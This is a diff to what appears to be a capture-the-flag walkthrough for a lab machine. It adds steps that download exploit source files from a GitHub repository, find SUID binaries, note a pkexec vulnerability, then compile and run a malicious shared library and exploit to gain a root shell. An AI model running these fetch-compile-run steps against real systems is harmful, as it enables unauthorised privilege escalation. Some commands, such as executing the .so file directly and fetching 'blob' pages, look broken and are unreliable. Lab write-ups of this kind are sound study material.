@@ -52,9 +52,22 @@ ssh ramses@192.168.100.167 -p 777
 ```
 
 ```bash
+wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/Nullbyte%3A1/evil-so.c
+wget https://github.com/ali-ctf-player/vulnhub-ctf-walkthroughs/blob/main/Nullbyte%3A1/exploit.c
+```
+
+```bash
 find / -perm /4000 2>/dev/null
 ```
 
 pkexec vuln exists.
 
-wget 
+```bash
+gcc -shared -o evil.so -fPIC evil-so.c
+gcc exploit.c -o exploit
+./evil.so
+./exploit
+```
+
+
+and BINGO..!! Root shell gained ..!
